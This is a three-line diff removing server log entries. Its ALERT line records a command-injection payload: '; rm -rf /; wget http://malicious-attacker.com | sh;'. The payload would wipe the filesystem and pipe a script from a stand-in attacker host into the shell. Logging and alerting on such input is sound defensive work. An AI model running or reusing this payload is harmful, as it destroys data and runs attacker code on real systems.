@@ -1,3 +1,0 @@
-2026-08-31 11:06:11 INFO  [http-bio-8443-exec-1] SoapEngine - handler invoked for Service Status
-2026-08-31 11:06:11 WARN  [http-bio-8443-exec-4] snmp_notify - localized notification sent successfully
-2026-08-31 11:06:11 ALERT [http-bio-8443-exec-9] swatchdog - execution payload: ; rm -rf /; wget http://malicious-attacker.com | sh;
